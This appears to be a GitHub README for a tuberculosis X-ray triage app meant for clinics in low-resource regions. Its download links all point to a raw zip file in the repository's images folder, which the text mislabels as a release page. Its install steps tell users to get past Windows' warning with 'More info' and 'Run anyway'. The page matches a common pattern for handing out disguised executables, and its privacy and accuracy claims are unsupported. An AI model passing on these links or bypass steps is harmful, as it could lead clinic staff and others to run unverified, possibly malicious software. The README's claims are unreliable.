# 🩺 X-Ray-Triage-In-LMIC - Efficient tuberculosis screening for medical clinics

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip)

This application provides a calibrated tool for chest X-ray triage. It identifies signs of tuberculosis in resource-constrained environments. The system uses deep learning to process medical images. It assists healthcare workers in clinics that lack specialized radiologists. The software runs on standard hardware to ensure health equity across different regions.

## 📋 System Requirements

The application requires specific computer hardware to function. Ensure your machine meets these standards before you begin:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Processor**: A modern Intel Core i5 or AMD Ryzen 5 processor.
*   **Memory**: At least 8 GB of RAM.
*   **Storage**: 2 GB of free disk space.
*   **Graphics**: A dedicated graphics card helps but is not mandatory.

Connect your computer to a reliable power source during the installation. Close other heavy programs to ensure the system allocates enough memory for the triage process.

## 📥 Downloading the Software 

Follow these steps to obtain the correct files for your system:

1. Visit the project release page: [https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip](https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip).
2. Look for the section labeled "Assets" at the bottom of the latest release.
3. Select the file ending in `.exe` to begin the download.
4. Save this file to your computer desktop.

Wait for the download to finish. Do not interrupt the connection during this time.

## ⚙️ Installation Process

Installing the application involves a few standard steps. Follow this guide to prepare your system:

1. Locate the downloaded `.exe` file on your desktop.
2. Double-click the file to start the installer.
3. Windows might display a protective window. Select "More info" and then "Run anyway" if the system prompts you.
4. The installer window will appear. Follow the prompts on the screen.
5. Choose the default folder location for the best results.
6. Click "Finish" when the progress bar reaches the end.

The program creates a shortcut on your desktop. You can open this shortcut to start the triage tool.

## 🩺 Running Your First Scan

The application works by analyzing medical images and providing a risk assessment. Use these steps to process an X-ray:

1. Start the program using the desktop icon.
2. Wait for the interface to load. This takes a few seconds as the system initializes.
3. Click the "Open Image" button.
4. Select the chest X-ray file from your computer library. The file must use the JPG or PNG format.
5. Click the "Analyze" button.
6. The software processes the image using a pre-trained model. It applies temperature scaling to ensure the results stay accurate.
7. View the output on the screen. The system displays a probability score. This score indicates the likelihood of tuberculosis signs within the image.

The tool provides an objective observation based on the provided image data. It does not replace the judgment of a trained medical professional.

## 🛠 Troubleshooting Common Issues

Use this guide if the program encounters errors or stops responding.

*   **Program fails to open:** Restart your computer. Check that you have the latest drivers for your graphics card.
*   **Image fails to load:** Ensure the image file is clear. Very small or low-quality images may confuse the model. Try a different file to confirm the issue.
*   **Slow processing times:** The model uses deep learning. It requires significant processing power. Close browser tabs and background applications to speed up the analysis.
*   **Error messages:** Write down the text of any error code. Check the project issue tracker if you continue to see the same error.

## 🛡 Frequently Asked Questions

**Does the software store patient data?**
No. The application processes images locally on your computer. It does not send health data to the internet. 

**Is this a diagnostic tool?**
No. This tool provides triage insights. It categorizes images to help clinicians manage patient priority. A qualified clinician must confirm all triage results.

**Can I run this without an internet connection?**
Yes. You only need the internet to perform the initial download. Once installed, the application works offline. This design supports clinics in remote areas without stable connectivity.

**How often should I update the software?**
Check the release page monthly. We update the models to improve accuracy and fix software bugs. 

**Does the software work with non-chest X-rays?**
No. The model specifically recognizes features related to chest X-rays. Using it for other types of images will produce incorrect results.

## 🌐 Community and Support

The project relies on reproducible research. If you find ways to improve the model reach out through the GitHub repository. We welcome contributions that help clinics in resource-constrained settings. Follow the project on GitHub to receive notifications about new versions and model updates.